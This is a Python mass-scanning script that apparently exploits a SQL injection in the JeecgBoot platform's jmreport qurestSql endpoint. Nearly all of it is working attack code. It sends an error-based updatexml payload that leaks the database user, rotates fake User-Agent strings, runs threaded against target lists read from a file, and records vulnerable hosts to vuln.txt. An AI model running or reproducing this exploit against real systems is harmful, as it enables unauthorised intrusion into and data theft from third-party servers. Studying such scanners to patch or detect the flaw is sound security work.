import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import re
import random
#title=="JeecgBoot 企业级低代码平台"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

proxies={'http': 'http://127.0.0.1:8080',
		'https': 'https://127.0.0.1:8080'}

def wirte_targets(vurl, filename):
	with open(filename, "a+") as f:
		f.write(vurl + "\n")

def check_url(url):
	url=parse.urlparse(url)
	url='{}://{}'.format(url[0],url[1])
	url="{}/jeecg-boot/jmreport/qurestSql".format(url)
	headers = {
		'User-Agent': get_ua(),
		'Content-Type': 'application/json;charset=UTF-8'
	}
	data = '''{"apiSelectId":"1290104038414721025",
"id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}'''
	# print(data)
	try:
		res = requests.post(url, verify=False, allow_redirects=False, headers=headers,data=data,timeout=5)
		
		if res.status_code == 200 and 'success":false' in res.text:
			# print(res.text)
			print("\033[32m[+]{}\033[0m".format(url))
			# data = res.text
			# username=re.findall(r'error:"(.*?)",',data)[0]
			wirte_targets(url,"vuln.txt")
		else:
			print("\033[34m[-]{} requests False! {}\033[0m".format(url,res.status_code))
			pass
			# rr=re.compile(r'Length(.*?)Date')
	except Exception as e:
		print("[!]{} requests timeout!".format(url))
		pass


def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_url, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	arg=ArgumentParser(description='check_vulnerabilities By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	print("[+]任务开始.....")
	start=time()
	if url != None and filename == None:
		check_url(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成,用时%ds.' %(end-start))